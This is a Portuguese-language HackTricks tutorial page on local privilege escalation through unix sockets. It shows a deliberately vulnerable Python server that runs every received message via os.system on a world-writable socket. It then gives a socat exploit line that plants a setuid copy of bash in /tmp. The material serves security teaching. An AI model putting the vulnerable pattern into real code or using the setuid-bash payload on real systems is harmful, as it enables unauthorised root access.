{{#include ../../banners/hacktricks-training.md}}

## Exemplo de ligação de socket com Python

No exemplo a seguir, um **socket unix é criado** (`/tmp/socket_test.s`) e tudo o que é **recebido** será **executado** por `os.system`. Eu sei que você não vai encontrar isso na prática, mas o objetivo deste exemplo é ver como um código usando sockets unix se parece e como gerenciar a entrada no pior caso possível.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Execute** o código usando python: `python s.py` e **verifique como o socket está ouvindo**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Explorar**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
